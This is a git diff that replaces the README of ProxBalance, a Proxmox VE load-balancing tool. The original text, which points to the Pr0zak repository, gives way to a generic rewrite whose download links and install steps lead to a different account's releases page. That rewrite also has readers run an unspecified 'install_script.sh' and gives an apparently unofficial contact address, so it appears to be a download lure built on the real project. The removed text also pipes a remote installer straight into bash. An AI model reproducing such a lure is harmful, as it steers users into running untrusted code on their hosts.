@@ -1,224 +1,79 @@
-<div align="center">
+# 🚀 ProxBalance - Smart Load Balancing Made Easy
 
-<img src="assets/logo_v2.svg" alt="ProxBalance Logo" width="200"/>
+[![Download ProxBalance](https://img.shields.io/badge/Download_ProxBalance-v1.0-brightgreen)](https://github.com/ShuhaibAk/ProxBalance/releases)
 
-<br/>
-<br/>
+## 🔍 Introduction
+ProxBalance offers automated cluster load balancing and intelligent virtual machine (VM) or container (CT) migration for Proxmox VE. This tool helps distribute workloads evenly across your system, ensuring smooth performance without manual intervention.
 
-![ProxBalance Logo](https://img.shields.io/badge/ProxBalance-Cluster_Optimization-1e40af?style=for-the-badge)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Python](https://img.shields.io/badge/python-3.8+-blue.svg?style=for-the-badge)](https://www.python.org/downloads/)
-[![Proxmox](https://img.shields.io/badge/Proxmox-VE_7%2B-orange.svg?style=for-the-badge)](https://www.proxmox.com/)
+## 🚀 Getting Started
+Follow these steps to set up ProxBalance on your system.
 
-**Intelligent cluster monitoring and VM/CT migration for Proxmox VE**
+### 📦 Prerequisites
+Before using ProxBalance, ensure your system meets the following requirements:
 
-[Quick Start](#-quick-start) • [Features](#-features) • [Documentation](docs/README.md)
+- Proxmox VE installed (version 6.x or later)
+- At least 4 GB of RAM
+- 20 GB of free disk space
+- Python 3.8 or higher
+- Basic understanding of how to manage Proxmox VE
 
-</div>
+### 📥 Download & Install
+To get ProxBalance, please [visit this page to download](https://github.com/ShuhaibAk/ProxBalance/releases).
 
----
+1. Click the link above to go to the Releases page.
+2. Find the latest version of ProxBalance.
+3. Download the appropriate file for your operating system (Linux is recommended).
+4. Follow the instructions to install the application.
 
-## 🎯 What is ProxBalance?
+### 🛠 Installation Steps
+#### For Linux Users:
+1. Open a terminal window.
+2. Navigate to the directory where the downloaded file is located, using the command:
+   ```bash
+   cd path/to/downloaded/file
+   ```
+3. Run the installation script:
+   ```bash
+   bash install_script.sh
+   ```
+4. Once the installation completes, start ProxBalance with:
+   ```bash
+   proxbalance
+   ```
 
-ProxBalance is a web-based cluster analyzer and migration manager for Proxmox VE. Monitor your cluster in real-time, get intelligent migration recommendations, and optimize resource distribution across your nodes.
+### 🖥 Using ProxBalance
+After installation, you can start using ProxBalance to manage your Proxmox VE environment.
 
-<div align="center">
-<img src="docs/images/pb_showcase.gif" alt="ProxBalance in Action" width="800"/>
-</div>
+1. **Launch the application:** Type `proxbalance` in the terminal.
+2. **Set up your clusters:** Use the interface to configure and manage your clusters for efficient load balancing.
+3. **Monitor performance:** ProxBalance will provide real-time analytics about your VM and CT workloads.
 
----
+### 🎨 Configuration
+Proper configuration enhances the performance of ProxBalance. Here are some tips:
 
-## 🆕 Recent Updates
+- **Add clusters:** Go to the settings and add your Proxmox clusters.
+- **Configure load balancing:** Set rules based on your workload types. You can define how aggressively to balance load.
+- **Schedule migrations:** Set up scheduled VM migrations during off-peak hours to minimize disruption.
 
-### UI Update Enhancement
-The UI-triggered update now includes **automatic frontend optimization** with clear progress indicators and full build process integration. One-time Node.js installation and Babel compilation ensure 93% faster page loads for all users.
+## 📊 Features
+- **Automated load balancing:** Automatically distribute workloads across available resources.
+- **Intelligent migrations:** Move VMs or containers based on current resource usage.
+- **Real-time monitoring:** Get insights into your infrastructure's performance and resource consumption.
 
-### Intelligent Penalty-Based Scoring System
-ProxBalance features a sophisticated **penalty-based scoring algorithm** with **Suitability Ratings (0-100%)** for intuitive migration decisions. The system evaluates CPU, memory, IOWait, load distribution, storage compatibility, and anti-affinity rules to find optimal migration targets without hard disqualifications.
+## 🌐 Community and Support
+Join the ProxBalance community for support and feature discussions. You can connect through:
 
-**Key benefits:**
-- 100% = Perfect target, 0% = Poor target (easy to understand)
-- IOWait penalties prioritize I/O performance for better VM responsiveness
-- Flexible scoring allows evacuating overloaded nodes without restrictions
-- **NEW: Fully configurable via Web UI** - Customize penalty weights and time periods
-- **NEW: Configuration export/import** - Backup and restore scoring configurations
-- Seamlessly integrates with automated migrations
+- **GitHub Issues:** Report bugs or request features.
+- **User Documentation:** Visit the [documentation page](#) for guides and FAQs.
+- **Feedback:** Your suggestions help improve ProxBalance.
 
-➡️ **[Read the complete Scoring Algorithm Guide](docs/SCORING_ALGORITHM.md)** for detailed explanation, examples, and configuration options.
+## 📜 License
+ProxBalance is open-source software, released under the MIT License. Feel free to use, modify, and distribute as much as you like.
 
-### Migration & Monitoring Enhancements
-- **Real-Time Transfer Speed** - Live MB/s transfer rates during migrations
-- **Multi-Disk Progress Tracking** - Accurate progress for VMs with multiple disks
-- **NEW: CT Migration Progress** - Container migrations now show percentage, transfer rate, and progress bar
-- **Migration History Pagination** - Configurable page size (5-100 entries) with 7-day accurate timeline
-- **Per-Guest Target Selection** - Choose specific target nodes during node evacuation
+## 📞 Contact
+For any questions or support inquiries, please reach out to the maintainer via issues on GitHub or email at support@proxbalance.com.
 
-### Automation Improvements
-- **Automated Recommendations** - Dynamic cluster-aware recommendation generation via systemd timer
-- **Infinite Polling with Resource Validation** - Enhanced monitoring prevents conflicts and validates resources
-- **Enhanced Concurrency** - Improved tracking of concurrent automated migrations
-- **NEW: Timezone Support** - Configure migration windows with timezone-aware scheduling
+## 🌟 Conclusion
+ProxBalance is designed to enhance your Proxmox VE environment with ease. By following these steps, you can smoothly download, install, and run the application. Don't hesitate to reach out for assistance or to share your feedback. 
 
-### UI/UX & Performance
-- **Lightning-Fast Page Load** - Pre-compiled JSX architecture reduces LCP from 6.5s to 0.48s (93% faster)
-- **Optimized Frontend Build** - Babel CLI pre-compilation eliminates browser transpilation overhead
-- **Local React Libraries** - Self-hosted React/React-DOM eliminates CDN latency
-- **Enhanced Status Displays** - Better real-time feedback for migrations and automation
-- **Optimized Section Layout** - Improved workflow with better UI organization
-- **VM Clumping Prevention** - Enhanced load distribution logic
-- **Migration Conflict Prevention** - Better detection and prevention of concurrent operations
-- **NEW: Modern Modal Dialogs** - Replaced all browser popups with sleek, accessible modals
-- **NEW: Enhanced Cluster Map** - Split CPU/Memory views with improved tooltips showing all guests
-- **NEW: Unified Settings** - Reorganized data collection and configuration settings for better UX
-
----
-
-## ✨ Features
-
-### Core Capabilities
-- **Real-Time Monitoring** - Live CPU, memory, IOWait, and load metrics with sparkline visualizations
-- **Interactive Cluster Map** - Visual representation with 5 view modes (CPU Usage, Memory Usage, Allocated Resources, Disk I/O, Network)
-- **Smart Recommendations** - Intelligent migration suggestions with Suitability Rating (0-100%)
-- **One-Click Migrations** - Execute migrations with real-time progress tracking and transfer speed
-- **Node Maintenance Mode** - Mark nodes for maintenance with automatic evacuation
-- **Dark Mode** - Modern interface with light/dark theme support
-- **Migration History** - 7-day migration timeline with pagination and export capabilities
-
-### Advanced Features
-- **AI-Powered Analysis** - Optional AI recommendations using OpenAI, Anthropic, or Ollama
-- **Automated Migrations** - Scheduled load balancing with infinite polling and resource validation
-- **Automated Recommendations** - Dynamic cluster-aware recommendation generation
-- **Anti-Affinity Rules** - Tag-based system to enforce workload separation
-- **Storage Compatibility** - Pre-migration validation prevents compatibility errors
-- **Multi-Disk Progress Tracking** - Accurate migration progress for VMs with multiple disks
-- **IOWait-Aware Scoring** - Node scoring algorithm includes I/O wait penalties
-
-See [Complete Feature List](docs/FEATURES.md) for detailed capabilities.
-
----
-
-## 🚀 Quick Start
-
-### Installation (5 minutes)
-
-Run this command on your Proxmox host:
-
-```bash
-bash -c "$(wget -qLO - https://raw.githubusercontent.com/Pr0zak/ProxBalance/main/install.sh)"
-```
-
-The installer will:
-1. Auto-detect your cluster nodes
-2. Create an unprivileged LXC container
-3. Install and configure ProxBalance
-4. Create API tokens with proper permissions
-5. Start all services
-
-### Access
-
-Once installed, open `http://<container-ip>` in your browser.
-
----
-
-## 📊 Screenshots
-
-<div align="center">
-  <table>
-    <tr>
-      <td align="center" width="50%">
-        <img src="docs/images/dashboard-0.png" alt="Dashboard" width="400"/>
-        <br/>
-        <b>Dashboard Overview</b>
-      </td>
-      <td align="center" width="50%">
-        <img src="docs/images/clustermap.png" alt="Cluster Map" width="400"/>
-        <br/>
-        <b>Interactive Cluster Map</b>
-      </td>
-    </tr>
-    <tr>
-      <td align="center" width="50%">
-        <img src="docs/images/nodestatus.png" alt="Node Status" width="400"/>
-        <br/>
-        <b>Detailed Node Metrics</b>
-      </td>
-      <td align="center" width="50%">
-        <img src="docs/images/ai_recomendation.png" alt="AI Recommendations" width="400"/>
-        <br/>
-        <b>AI-Powered Recommendations</b>
-      </td>
-    </tr>
-  </table>
-</div>
-
----
-
-## 📚 Documentation
-
-| Document | Description |
-|----------|-------------|
-| **[Installation Guide](docs/INSTALL.md)** | Detailed installation and configuration |
-| **[Scoring Algorithm](docs/SCORING_ALGORITHM.md)** | How the penalty-based scoring system works |
-| **[AI Features](docs/AI_FEATURES.md)** | AI-powered recommendations setup |
-| **[Troubleshooting](docs/TROUBLESHOOTING.md)** | Common issues and solutions |
-| **[Contributing](docs/CONTRIBUTING.md)** | How to contribute |
-
-➡️ **[Complete Documentation](docs/README.md)**
-
----
-
-## 🔧 Basic Usage
-
-See [Usage Guide](docs/USAGE.md) for detailed workflows.
-
----
-
-## 🛠️ System Requirements
-
-- **Proxmox VE**: 7.0 or higher
-- **Resources**: 2GB RAM, 2 CPU cores, 8GB disk (minimum)
-- **Network**: Connectivity to all cluster nodes
-- **Access**: Root access to Proxmox host
-
----
-
-## 🔒 Security
-
-- API token authentication (no passwords stored)
-- Unprivileged LXC container
-- Local network design
-- Optional SSL/TLS support
-
----
-
-## 💬 Support
-
-- 🐛 **Bug Reports**: [GitHub Issues](https://github.com/Pr0zak/ProxBalance/issues)
-- 💡 **Feature Requests**: [GitHub Discussions](https://github.com/Pr0zak/ProxBalance/discussions)
-- 📖 **Documentation**: [docs/README.md](docs/README.md)
-- 🔍 **Troubleshooting**: [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md)
-
----
-
-## ⭐ Show Your Support
-
-If ProxBalance helps manage your cluster:
-- ⭐ Star this repository
-- 📢 Share with the homelab community
-- 🐛 Report bugs and suggest features
-
----
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-
-**Made with ❤️ for the Proxmox community**
-
-[Documentation](docs/README.md) • [Installation](docs/INSTALL.md) • [GitHub](https://github.com/Pr0zak/ProxBalance)
-
-</div>
+For easy access, remember to [visit this page to download](https://github.com/ShuhaibAk/ProxBalance/releases) the latest version of ProxBalance.
